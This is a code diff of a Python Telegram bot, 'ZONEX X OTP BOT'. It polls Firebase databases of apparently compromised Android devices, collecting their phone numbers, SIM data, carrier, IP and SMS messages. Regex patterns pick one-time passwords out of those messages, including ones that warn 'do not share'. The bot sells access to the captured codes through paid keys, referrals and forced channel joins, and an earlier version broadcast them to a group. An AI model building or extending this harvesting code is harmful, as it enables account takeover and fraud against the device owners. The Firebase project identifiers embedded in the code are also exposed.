@@ -1,9 +1,11 @@
 
+
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v9.1              ║
-║  Device Sync · Anti-Spam · Dynamic Count ║
+║        ZONEX X OTP BOT v4.6              ║
+║  Channel Gate · Key Entry · Time Plans   ║
+║  Referral · Multi-Firebase · Admin Panel ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -27,21 +29,12 @@ _admin_ids_setting = (
     or "8917259924"
 )
 ADMIN_IDS      = [int(x.strip()) for x in _admin_ids_setting.split(",") if x.strip()]
-ADMIN_USERNAME = "@AG01448"
+ADMIN_USERNAME = "@AG14447"
 BOT_DEV        = "@zonexarmy"
 DATA_FILE      = "bot/data.json"
 AUTO_REFRESH   = 10
 
-CHANNELS = ["zonexarmy", "SMARTEARNERS011", "ZonexotpGroup"]
-CH_NAMES = {
-    "zonexarmy": "📢 𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
-    "SMARTEARNERS011": "⚔️ SMART EARNERS",
-    "ZonexotpGroup": "💬 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏 𝐆𝐑𝐎𝐔𝐏",
-}
-
-OTP_ALERT_GROUP_ID = -1004463422895
-
-# ─── Firebase Configuration ──────────────────────────────────────────────────
+# ─── Firebase Configuration (UPDATED with your config) ─────────────────────
 FIREBASE_CONFIG = {
     "apiKey": os.getenv("FIREBASE_API_KEY", ""),
     "authDomain": "era-ka-store.firebaseapp.com",
@@ -50,9 +43,10 @@ FIREBASE_CONFIG = {
     "messagingSenderId": "540743058625",
     "appId": "1:540743058625:web:d0938c9cfa3e4750e48040",
     "measurementId": "G-QZGN0SFYHC",
-    "databaseURL": "https://era-ka-store-default-rtdb.firebaseio.com"
+    "databaseURL": "https://era-ka-store-default-rtdb.firebaseio.com"  # Added for RTDB
 }
 
+# Use API Key from config
 GAPI_KEY = FIREBASE_CONFIG["apiKey"]
 FS_PROJECT = FIREBASE_CONFIG["projectId"]
 FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"
@@ -60,6 +54,13 @@ FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"
 DEVICES_PER_PAGE = 6
 WELCOME_HOURS  = 1
 
+CHANNELS = ["zonexarmy", "SMARTEARNERS011"]   # force-join channels (without @)
+CH_NAMES = {
+    "zonexarmy": "𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
+    "SMARTEARNERS011": "SMART EARNERS",
+}
+
+# ─── Conversation states ──────────────────────────────────────────────────────
 WAIT_KEY        = 10
 WAIT_FB_URL     = 20
 WAIT_FB_LABEL   = 21
@@ -72,12 +73,14 @@ logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s",
                     level=logging.INFO, datefmt="%Y-%m-%d %H:%M:%S")
 logger = logging.getLogger(__name__)
 
+# ─── Refresh lock ────────────────────────────────────────────────────────────
 _refresh_lock: asyncio.Lock = None
-sent_otps_cache = set()
 
+# ─── Key generator ────────────────────────────────────────────────────────────
 def _gen_key_raw(length=10) -> str:
     return "ZONEX-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
+# ─── Persistent Storage ───────────────────────────────────────────────────────
 def _default_data() -> dict:
     return {
         "users": {},
@@ -126,30 +129,49 @@ def save_data(d: dict):
     os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
     with open(DATA_FILE, "w") as f:
         json.dump(d, f, indent=2)
+    # Push to Firebase Realtime Database
     try:
         loop = asyncio.get_running_loop()
         loop.create_task(_push_firestore(d))
     except RuntimeError:
-        pass
+        pass  # No running loop yet
 
 async def _push_firestore(d: dict):
-    if not GAPI_KEY: return
+    """Push bot data to Firebase Realtime Database with your API key."""
+    if not GAPI_KEY:
+        logger.warning("⚠️ GAPI_KEY not set! Data not saved to Firebase.")
+        return
+    
     try:
         payload = json.dumps(d, separators=(",", ":"))
+        # Use your actual Firebase API key for authentication
         url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
-        async with _get_session().put(url, data=payload, headers={"Content-Type": "application/json"}) as r:
-            pass
+        
+        async with _get_session().put(url, data=payload,
+                         headers={"Content-Type": "application/json"}) as r:
+            if r.status in (200, 201):
+                logger.info("✅ Firebase RTDB save successful")
+            else:
+                body = await r.text()
+                logger.warning(f"❌ Firebase RTDB save failed: {r.status} - {body[:200]}")
     except Exception as e:
         logger.warning(f"❌ Firebase RTDB push error: {e}")
 
 async def _load_firestore() -> bool:
-    if not GAPI_KEY: return False
+    """Load bot data from Firebase Realtime Database on startup."""
+    if not GAPI_KEY:
+        logger.warning("⚠️ GAPI_KEY not set! Using local data only.")
+        return False
+    
     try:
         url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
         async with _get_session().get(url) as r:
             if r.status == 200:
                 d = await r.json()
-                if not isinstance(d, dict): return False
+                if not isinstance(d, dict):
+                    return False
+                
+                # Apply migrations
                 d.pop("activation_codes", None)
                 for uid, u in d.get("users", {}).items():
                     u.setdefault("key",            _gen_key_raw())
@@ -165,41 +187,69 @@ async def _load_firestore() -> bool:
                 d.setdefault("qr_file_id",       "")
                 d.setdefault("pending_payments", {})
                 d.setdefault("maintenance",      False)
-
+                
                 global data
                 data = d
-
+                
+                # Write local backup
                 os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
                 with open(DATA_FILE, "w") as f:
                     json.dump(d, f, indent=2)
+                
+                logger.info(f"✅ Firebase RTDB load OK — {len(d.get('users',{}))} users")
                 return True
+            elif r.status == 401:
+                logger.error(f"❌ Firebase auth failed! Check API key: {GAPI_KEY[:10]}...")
+            elif r.status == 404:
+                logger.info("ℹ️ Firebase: No cloud data yet, will create on first save")
+            else:
+                body = await r.text()
+                logger.warning(f"Firebase load: {r.status} - {body[:120]}")
     except Exception as e:
         logger.warning(f"Firebase load error: {e}")
     return False
 
+# Load data (will try Firebase first, then fallback to local)
 data = load_data()
 
+# Try to load from Firebase on startup (async, will be called in _on_startup)
 async def _sync_from_firebase_on_startup():
-    await _load_firestore()
+    """Try to load from Firebase on startup"""
+    loaded = await _load_firestore()
+    if not loaded:
+        logger.info("⚠️ Using local data.json (Firebase not available or empty)")
+    else:
+        logger.info("✅ Using Firebase data")
 
+# ─── Helper functions ─────────────────────────────────────────────────────────
 def get_referral_hours() -> float:
     return float(data.get("referral_hours", 1))
 
+# ─── Cache ────────────────────────────────────────────────────────────────────
 device_cache: dict   = {}
 otp_cache:    dict   = {}
 last_refresh         = "Never"
-fb_last_sync: dict   = {}
-fb_conn_status: dict = {}
+fb_last_sync: dict   = {}   # label -> "HH:MM:SS" when last synced
+fb_conn_status: dict = {}   # label -> "ok" | "error" | "timeout" | "auth"
 
+# ─── Global HTTP session ─────────────────────────────────────────────────────
 _http_session: Optional[aiohttp.ClientSession] = None
 
 def _get_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=30, ttl_dns_cache=300, enable_cleanup_closed=True)
-        _http_session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=6))
+        connector = aiohttp.TCPConnector(
+            limit=30,
+            ttl_dns_cache=300,
+            enable_cleanup_closed=True,
+        )
+        _http_session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=6),
+        )
     return _http_session
 
+# ─── Time helpers ─────────────────────────────────────────────────────────────
 IST = timezone(timedelta(hours=5, minutes=30))
 
 def now_dt() -> datetime:
@@ -222,7 +272,8 @@ def time_left_str(uid: int) -> str:
     if diff.total_seconds() <= 0: return "⏰ Expired"
     h = int(diff.total_seconds() // 3600)
     m = int((diff.total_seconds() % 3600) // 60)
-    if h >= 24: return f"✅ {h//24}d {h%24}h {m}m"
+    if h >= 24:
+        return f"✅ {h//24}d {h%24}h {m}m"
     return f"✅ {h}h {m}m"
 
 def time_left_detailed(uid: int) -> str:
@@ -230,11 +281,13 @@ def time_left_detailed(uid: int) -> str:
     exp = expires_dt(uid)
     if not exp: return "❌ No Access"
     diff = exp - now_dt()
-    if diff.total_seconds() <= 0: return f"⏰ Expired ({exp.strftime('%d/%m %H:%M')})"
+    if diff.total_seconds() <= 0:
+        return f"⏰ Expired ({exp.strftime('%d/%m %H:%M')})"
     h = int(diff.total_seconds() // 3600)
     m = int((diff.total_seconds() % 3600) // 60)
     exp_str = exp.strftime('%d/%m/%Y %H:%M')
-    if h >= 24: return f"✅ {h//24}d {h%24}h {m}m left\n   📅 Expires: {exp_str}"
+    if h >= 24:
+        return f"✅ {h//24}d {h%24}h {m}m left\n   📅 Expires: {exp_str}"
     return f"✅ {h}h {m}m left\n   📅 Expires: {exp_str}"
 
 def add_hours(uid: int, hours: float):
@@ -246,6 +299,11 @@ def add_hours(uid: int, hours: float):
     data["users"][str(uid)]["expires_at"] = new_exp.strftime("%Y-%m-%d %H:%M:%S")
     save_data(data)
 
+def set_expiry(uid: int, dt: datetime):
+    data["users"][str(uid)]["expires_at"] = dt.strftime("%Y-%m-%d %H:%M:%S")
+    save_data(data)
+
+# ─── User helpers ─────────────────────────────────────────────────────────────
 def is_admin(uid: int) -> bool:
     return uid in ADMIN_IDS
 
@@ -277,6 +335,7 @@ def ensure_user(uid: int, username: str, name: str, referred_by: Optional[int] =
 def get_key(uid: int) -> str:
     return data["users"].get(str(uid), {}).get("key", "—")
 
+# ─── Channel helpers ──────────────────────────────────────────────────────────
 async def check_channels(bot, uid: int) -> tuple[bool, list[str]]:
     missing = []
     for ch in CHANNELS:
@@ -295,6 +354,7 @@ def kb_channels(missing: list[str]) -> InlineKeyboardMarkup:
     rows.append([InlineKeyboardButton("✅ Continue Verify", callback_data="check_join")])
     return InlineKeyboardMarkup(rows)
 
+# ─── OTP helpers ──────────────────────────────────────────────────────────────
 def extract_otp(text: str) -> Optional[str]:
     pats = [
         r'(?:OTP|One[\s\-]?Time[\s\-]?Password)\s*(?:is|:|\s)\s*(\d{4,8})',
@@ -309,12 +369,21 @@ def extract_otp(text: str) -> Optional[str]:
         r'(?:is|:)\s+(\d{8})\b',
         r'(?:is|:)\s+(\d{5})\b',
         r'(?:use|enter|share)\s+(?:this\s+)?(?:OTP|code)\s*[:\-]?\s*(\d{4,8})',
+        r'(?:do not|dont|never)\s+share.*?(\d{6})',
+        r'(?:do not|dont|never)\s+share.*?(\d{4})',
+        r'(?:do not|dont|never)\s+share.*?(\d{8})',
+        r'valid\s+for.*?(\d{6})',
+        r'expires?\s+in.*?(\d{6})',
         r'\b(\d{6})\b',
         r'\b(\d{8})\b',
         r'\b(\d{5})\b',
         r'\b(\d{4})\b',
     ]
-    skip = {'2023','2024','2025','2026','2027','2028','2029','2030','1234','0000','1111','12345','123456','000000'}
+    skip = {
+        '2023','2024','2025','2026','2027','2028','2029','2030',
+        '1234','0000','1111','2222','3333','4444','5555','6666','7777','8888','9999',
+        '12345','123456','000000','111111',
+    }
     for p in pats:
         m = re.search(p, text, re.IGNORECASE)
         if m and m.group(1) not in skip:
@@ -329,7 +398,10 @@ def _parse_ts_dt(ts) -> Optional[datetime]:
             return datetime.utcfromtimestamp(t / 1000) + timedelta(hours=5, minutes=30)
         if isinstance(ts, str) and ts.strip():
             clean = ts.replace(" | ", " ").replace("|", " ").strip()
-            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S", "%d-%m-%Y %H:%M:%S", "%Y-%m-%d %H:%M:%S"):
+            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
+                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
+                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
+                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                 try: return datetime.strptime(clean[:19], fmt)
                 except: pass
     except: pass
@@ -343,30 +415,31 @@ def fmt_ts(ts) -> str:
             return (datetime.utcfromtimestamp(t/1000) + timedelta(hours=5, minutes=30)).strftime("%d/%m/%Y %H:%M")
         if isinstance(ts, str) and ts.strip():
             clean = ts.replace(" | ", " ").replace("|", " ").strip()
-            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S", "%d-%m-%Y %H:%M:%S", "%Y-%m-%d %H:%M:%S"):
+            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
+                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
+                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
+                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                 try: return datetime.strptime(clean[:19], fmt).strftime("%d/%m/%Y %H:%M")
                 except: pass
             return clean[:16]
     except: pass
     return "—"
 
+# ─── Firebase ─────────────────────────────────────────────────────────────────
 async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
     base = url.rstrip("/")
     ep   = f"{base}/{path}.json" + (f"?auth={key}" if key else "")
     try:
         async with _get_session().get(ep) as r:
             return await r.json() if r.status == 200 else None
-    except Exception:
-        pass
+    except Exception as e:
+        logger.warning(f"fb_get [{path}]: {e}")
     return None
 
 async def fetch_otps(url: str, key: str, dev_id: str):
     raw = await fb_get(url, f"messages/{dev_id}", key)
-    if raw is None or not isinstance(raw, dict):
+    if raw is None:
         raw = await fb_get(url, f"clients/{dev_id}/messages", key)
-    if raw is None or not isinstance(raw, dict):
-        raw = await fb_get(url, f"devices/{dev_id}/messages", key)
-
     if not isinstance(raw, dict): return [], None
 
     otps: list  = []
@@ -391,110 +464,60 @@ async def fetch_otps(url: str, key: str, dev_id: str):
             })
     return otps, last_any_dt
 
-def resolve_phone(info: dict, dev_id: str = "") -> str:
-    if not isinstance(info, dict): return "—"
-    BAD = {"", "none", "null", "—", "-", "–", "unknown", "n/a", "na", "undefined", "invalid", "no number"}
-    def _clean(v):
-        if v is None: return ""
-        s = str(v).strip()
-        if s.lower() in BAD: return ""
-        return s
-
-    candidates = [
-        info.get("mobNo"), info.get("phoneNumber"), info.get("phone_number"),
-        info.get("PhoneNumber"), info.get("phone"), info.get("mobile"),
-        info.get("Mobile"), info.get("mob"), info.get("number"),
-        info.get("Number"), info.get("msisdn"), info.get("simNumber"),
-        info.get("sim_number"), info.get("contact")
-    ]
-
-    sims = info.get("sims") or info.get("SIMs") or info.get("sim") or {}
-    if isinstance(sims, dict): sims = list(sims.values())
-    if isinstance(sims, list):
-        for s in sims:
-            if not isinstance(s, dict): continue
-            candidates.extend([s.get("phoneNumber"), s.get("phone"), s.get("number"), s.get("mobNo"), s.get("mobile"), s.get("msisdn")])
-
-    for nest_key in ("device", "info", "data", "details", "meta"):
-        nest = info.get(nest_key)
-        if isinstance(nest, dict):
-            candidates.extend([nest.get("phone"), nest.get("phoneNumber"), nest.get("mobNo"), nest.get("mobile")])
-
-    found_deep = ""
-    def _deep_scan(d):
-        nonlocal found_deep
-        if found_deep: return
-        if isinstance(d, dict):
-            for k, v in d.items():
-                if "phone" in str(k).lower() or "mob" in str(k).lower() or "number" in str(k).lower():
-                    s = _clean(v)
-                    if s and s.isdigit() and 10 <= len(s) <= 13:
-                        found_deep = s
-                        return
-                if isinstance(v, (dict, list)): _deep_scan(v)
-        elif isinstance(d, list):
-            for v in d: _deep_scan(v)
-    _deep_scan(info)
-    if found_deep: candidates.append(found_deep)
-
-    for c in candidates:
-        s = _clean(c)
-        if s:
-            digits = re.sub(r"\D", "", s)
-            if len(digits) >= 10:
-                return _normalize_phone(s)
-
-    if dev_id and dev_id.isdigit() and 10 <= len(dev_id) <= 13:
-        return _normalize_phone(dev_id)
-    return "—"
-
-# ─── SINGLE SOURCE OF TRUTH: online-status detection ─────────────────────────
-def _is_device_online(info: dict) -> bool:
-    """Used by BOTH refresh_firebase and refresh_clients_only so counts match."""
-    if not isinstance(info, dict):
-        return False
-    return bool(
-        info.get("status")
-        or info.get("isOnline")
-        or info.get("is_online")
-        or info.get("online")
-    )
-
-def _build_device_record(dev_id: str, info: dict) -> dict:
-    phone = resolve_phone(info, dev_id)
-    ts_raw = (info.get("lastSeen") or info.get("last_seen") or info.get("lastOnline") or "")
-    return {
-        "online":    _is_device_online(info),
-        "phone":     phone,
-        "name":      str(info.get("modelName") or info.get("model") or dev_id),
-        "battery":   str(info.get("battery", "—")),
-        "android":   str(info.get("androidV") or info.get("androidVersion", "—")),
-        "network":   str(info.get("service_provider") or info.get("provider", "—")),
-        "ip":        str(info.get("ip_address", "—")),
-        "last_seen": fmt_ts(ts_raw),
-    }
-
 async def refresh_firebase(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
     clients = await fb_get(url, "clients", key)
-    if not isinstance(clients, dict):
-        fb_conn_status[label] = "error"
-        return
+    if not isinstance(clients, dict): return
+
+    today = now_dt().date()
 
     valid = []
     for dev_id, info in clients.items():
         if not isinstance(info, dict): continue
-        valid.append((dev_id, info))
+        sims = info.get("sims") or {}
+        sl   = sims if isinstance(sims, list) else list(sims.values())
+        def _pick(*vals):
+            for v in vals:
+                s = str(v).strip()
+                if s and s not in ("None","none","","—","-","Unknown","unknown","null"):
+                    return s
+            return "—"
+        sim_phone = sl[0].get("phoneNumber") or sl[0].get("phone") or sl[0].get("number","") if sl else ""
+        phone = _pick(
+            info.get("mobNo"), info.get("phoneNumber"), info.get("phone"),
+            info.get("mobile"), info.get("Mobile"), info.get("phone_number"),
+            info.get("PhoneNumber"), sim_phone,
+        )
+        valid.append((dev_id, info, phone))
 
     async def _fetch_one(dev_id):
-        try: return await fetch_otps(url, key, dev_id)
-        except: return [], None
+        try:
+            return await fetch_otps(url, key, dev_id)
+        except Exception as e:
+            logger.warning(f"fetch_otps [{dev_id}]: {e}")
+            return [], None
 
-    results = await asyncio.gather(*[_fetch_one(dev_id) for dev_id, _ in valid])
+    results = await asyncio.gather(*[_fetch_one(dev_id) for dev_id, _, _ in valid])
 
     devs, otps_map = {}, {}
-    for (dev_id, info), (raw_otps, _last_msg_dt) in zip(valid, results):
-        devs[dev_id] = _build_device_record(dev_id, info)
+    for (dev_id, info, phone), (raw_otps, _last_msg_dt) in zip(valid, results):
+        phone_ok = _has_valid_phone({"phone": phone})
+        fb_status = bool(info.get("status") or info.get("isOnline") or
+                         info.get("is_online") or info.get("online"))
+        is_online  = fb_status and phone_ok
+
+        ts_raw = (info.get("lastSeen") or info.get("last_seen") or
+                  info.get("lastOnline") or "")
+        devs[dev_id] = {
+            "online":    is_online,
+            "phone":     phone,
+            "name":      str(info.get("modelName") or info.get("model") or dev_id),
+            "battery":   str(info.get("battery","—")),
+            "android":   str(info.get("androidV") or info.get("androidVersion","—")),
+            "network":   str(info.get("service_provider") or info.get("provider","—")),
+            "ip":        str(info.get("ip_address","—")),
+            "last_seen": fmt_ts(ts_raw),
+        }
         otps_map[dev_id] = raw_otps[:10]
 
     device_cache[label]    = devs
@@ -506,91 +529,107 @@ async def refresh_clients_only(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
     clients = await fb_get(url, "clients", key)
     if not isinstance(clients, dict):
-        fb_conn_status[label] = "error"
         return
     devs = {}
     for dev_id, info in clients.items():
-        if not isinstance(info, dict): continue
-        devs[dev_id] = _build_device_record(dev_id, info)
+        if not isinstance(info, dict):
+            continue
+        sims = info.get("sims") or {}
+        sl   = sims if isinstance(sims, list) else list(sims.values())
+        def _pick(*vals):
+            for v in vals:
+                s = str(v).strip()
+                if s and s not in ("None", "none", "", "—", "-", "Unknown", "unknown", "null"):
+                    return s
+            return "—"
+        sim_phone = (sl[0].get("phoneNumber") or sl[0].get("phone") or sl[0].get("number", "")) if sl else ""
+        phone = _pick(
+            info.get("mobNo"), info.get("phoneNumber"), info.get("phone"),
+            info.get("mobile"), info.get("Mobile"), info.get("phone_number"),
+            info.get("PhoneNumber"), sim_phone,
+        )
+        phone_ok  = _has_valid_phone({"phone": phone})
+        fb_status = bool(info.get("status") or info.get("isOnline") or
+                         info.get("is_online") or info.get("online"))
+        is_online = fb_status and phone_ok
+        ts_raw    = (info.get("lastSeen") or info.get("last_seen") or
+                     info.get("lastOnline") or "")
+        devs[dev_id] = {
+            "online":    is_online,
+            "phone":     phone,
+            "name":      str(info.get("modelName") or info.get("model") or dev_id),
+            "battery":   str(info.get("battery", "—")),
+            "android":   str(info.get("androidV") or info.get("androidVersion", "—")),
+            "network":   str(info.get("service_provider") or info.get("provider", "—")),
+            "ip":        str(info.get("ip_address", "—")),
+            "last_seen": fmt_ts(ts_raw),
+        }
     device_cache[label]   = devs
     fb_last_sync[label]   = now_dt().strftime("%H:%M:%S")
-    fb_conn_status[label] = "ok"
-
-# ─── Text Builders ────────────────────────────────────────────────────────────
-def txt_new_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
-    phone = info.get('phone') or "—"
-    date_val = e['time'].split()[0] if ' ' in e['time'] else e['time']
-    time_val = e['time'].split()[1] if ' ' in e['time'] else ''
-
-    return (
-        f"╔══════════════════════════╗\n"
-        f"⚡ <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐀𝐋𝐄𝐑𝐓</b> ⚡\n"
-        f"╚══════════════════════════╝\n\n"
-        f" 🔐 <b>𝐘𝐎𝐔𝐑 𝐎𝐓𝐏 :</b>  <code>{e['otp']}</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📱 <b>𝐌𝐎𝐁𝐈𝐋𝐄 :</b> {phone}\n"
-        f"📩 <b>𝐒𝐄𝐍𝐃𝐄𝐑 :</b> {e['sender']}\n"
-        f"📅 <b>𝐃𝐀𝐓𝐄 :</b> {date_val}\n"
-        f"⏰ <b>𝐓𝐈𝐌𝐄 :</b> {time_val}\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"💬 <b>𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</b>\n\n"
-        f"{e['msg']}\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🤖 <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
-        f"{BOT_DEV}"
-    )
-
-def txt_group_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
-    phone = info.get('phone') or "—"
-    country = "India 🇮🇳" if phone.startswith("+91") else "Unknown 🌍"
-    return (
-        f"⚡ <b>𝐙𝐎𝐍𝐄𝐗 𝐗 | 𝐎𝐓𝐏 𝐀𝐋𝐄𝐑𝐓</b> ⚡\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🔐 <b>𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐂𝐎𝐃𝐄</b>\n\n"
-        f"<code>\"{e['otp']}\"</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🌍 <b>𝐂𝐎𝐔𝐍𝐓𝐑𝐘</b>\n"
-        f"{country}\n\n"
-        f"📱 <b>𝐏𝐇𝐎𝐍𝐄 𝐍𝐔𝐌𝐁𝐄𝐑</b>\n"
-        f"{phone[:7]}..{phone[-4:] if len(phone)>7 else ''}\n\n"
-        f"👤 <b>𝐍𝐀𝐌𝐄</b>\n"
-        f"{e['sender']}\n\n"
-        f"🕒 <b>𝐓𝐈𝐌𝐄</b>\n"
-        f"{e['time']}\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"💬 <b>𝐌𝐄𝐒𝐒𝐀𝐆𝐄</b>\n\n"
-        f"{e['msg']}\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🤖 @ZonexXearningBot\n"
-        f"⚡ <b>𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏</b>"
-    )
+    if label not in fb_conn_status:
+        fb_conn_status[label] = "ok"
 
 async def refresh_all():
     global last_refresh, _refresh_lock
-    if _refresh_lock is None: _refresh_lock = asyncio.Lock()
+    if _refresh_lock is None:
+        _refresh_lock = asyncio.Lock()
     if _refresh_lock.locked():
-        async with _refresh_lock: return
+        async with _refresh_lock:
+            return
     async with _refresh_lock:
         async def _safe(cfg):
-            try: await refresh_firebase(cfg)
+            try:
+                await refresh_firebase(cfg)
             except Exception as e:
+                logger.error(f"Refresh [{cfg['label']}]: {e}")
                 fb_conn_status[cfg["label"]] = "error"
         await asyncio.gather(*[_safe(cfg) for cfg in data["firebase_configs"]])
         last_refresh = now_dt().strftime("%H:%M:%S")
+        logger.info(f"✅ Refresh done | {last_refresh}")
 
+# ─── Stats ────────────────────────────────────────────────────────────────────
 def _normalize_phone(ph: str) -> str:
     ph = str(ph).strip()
     digits = re.sub(r"[\s\-\.\(\)]", "", ph)
     pure = digits.lstrip("+")
-    if not pure.isdigit(): return ph
-    if len(pure) == 10 and pure[0] in "6789": return f"+91{pure}"
-    if len(pure) == 12 and pure.startswith("91"): return f"+{pure}"
-    if digits.startswith("+"): return digits
+    if not pure.isdigit():
+        return ph
+    if len(pure) == 10 and pure[0] in "6789":
+        return f"+91{pure}"
+    if len(pure) == 12 and pure.startswith("91"):
+        return f"+{pure}"
+    if digits.startswith("+"):
+        return digits
     return f"+{pure}"
 
-# ─── DYNAMIC COUNTERS — single source, no dedup, no page filtering ───────────
+def _has_valid_phone(info: dict) -> bool:
+    ph = str(info.get("phone", "")).strip()
+    if not ph:
+        return False
+    low = ph.lower()
+    bad_words = {"unknown", "none", "null", "n/a", "na", "no number",
+                 "not available", "unavailable", "undefined", "invalid"}
+    if low in bad_words or low in ("—", "-", "–", "—"):
+        return False
+    if low.endswith("new"):
+        return False
+    # Space nahi hona chahiye number mein
+    if " " in ph:
+        return False
+    # Sirf digits aur ek leading '+' allowed hai
+    stripped = ph.lstrip("+")
+    # Letters ya special chars (o, nya, etc.) reject karo
+    if not stripped.isdigit():
+        return False
+    digits_only = stripped
+    if len(digits_only) < 6:
+        return False
+    return True
+
 def count_online() -> int:
-    return sum(1 for dm in device_cache.values() for d in dm.values() if d.get("online"))
+    return sum(1 for dm in device_cache.values()
+               for d in dm.values()
+               if d.get("online") and _has_valid_phone(d))
 
 def count_total() -> int:
     return sum(len(dm) for dm in device_cache.values())
@@ -599,62 +638,85 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 def all_online() -> list:
-    """Every online record across ALL Firebase DBs, no dedup by phone."""
-    res = []
-    for lb, dm in device_cache.items():
-        for did, info in dm.items():
-            if info.get("online"):
-                res.append((lb, did, info))
-    return res
+    return [(lb, did, info)
+            for lb, dm in device_cache.items()
+            for did, info in dm.items()
+            if info.get("online") and _has_valid_phone(info)]
 
 def resolve_label(esc: str) -> str:
     for cfg in data["firebase_configs"]:
-        if cfg["label"].replace(":","_") == esc or cfg["label"] == esc: return cfg["label"]
+        if cfg["label"].replace(":","_") == esc or cfg["label"] == esc:
+            return cfg["label"]
     return esc
 
+# ─── Text builders ────────────────────────────────────────────────────────────
 def txt_welcome_panel(name: str, uid: int) -> str:
     tl  = time_left_str(uid)
     on  = count_online()
     otp = count_otps()
+    dbs = len(data['firebase_configs'])
     return (
-        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-        f"🤖 <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
-        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-        f"👋 Welcome, <b>{name}</b>!\n\n"
-        f"╭──────────────────────╮\n"
-        f"⏱️ <b>𝐀𝐂𝐂𝐄𝐒𝐒</b>  ›  {tl}\n"
-        f"🟢 <b>𝐒𝐓𝐀𝐓𝐔𝐒</b>   ›  ✅ Active\n"
-        f"╰──────────────────────╯\n\n"
-        f"╭━━━ 📡 <b>𝐋𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐒</b> ━━━╮\n"
-        f"🟢 Online      › {on}\n"
-        f"🔑 Total OTPs  › {otp}\n"
-        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-        f"🕐 Last Sync  › {last_refresh}\n"
-        f"🔄 Auto Refresh › {AUTO_REFRESH}s"
+        f"🤖 <b>ZONEX X OTP Bot</b>\n"
+        f"{'━'*28}\n\n"
+        f"👋 Hey, <b>{name}!</b>\n"
+        f"⏱ Access  ›  <b>{tl}</b>\n\n"
+        f"<b>📡 Live Status</b>\n"
+        f"  ├ 🟢 Online   <code>{on}</code> device{'s' if on!=1 else ''}\n"
+        f"  ├ 🔑 OTPs     <code>{otp}</code>\n"
+        f"  └ 🔥 Firebase  <code>{dbs}</code> DB\n\n"
+        f"<i>🕐 Last sync: {last_refresh}  ·  auto {AUTO_REFRESH}s</i>"
     )
+
+def _val(v: str) -> bool:
+    return bool(v) and v not in ("—", "-", "–", "None", "none", "null", "")
 
 def txt_device_card(label: str, dev_id: str) -> str:
     info  = device_cache.get(label, {}).get(dev_id, {})
     otps  = otp_cache.get(label, {}).get(dev_id, [])
-    phone = info.get('phone') or "—"
+    phone = _normalize_phone(info.get('phone','—'))
+    battery   = str(info.get('battery','—'))
+    android   = str(info.get('android','—'))
+    network   = str(info.get('network','—'))
+    ip        = str(info.get('ip','—'))
+    last_seen = str(info.get('last_seen','—'))
+
+    header = (
+        f"📱 <b><code>{phone}</code></b>  <i>(tap to copy)</i>\n"
+        f"{'━'*28}\n"
+        f"🔋 Battery  ›  <code>{battery}</code>\n"
+        f"🤖 Android  ›  <code>{android}</code>\n"
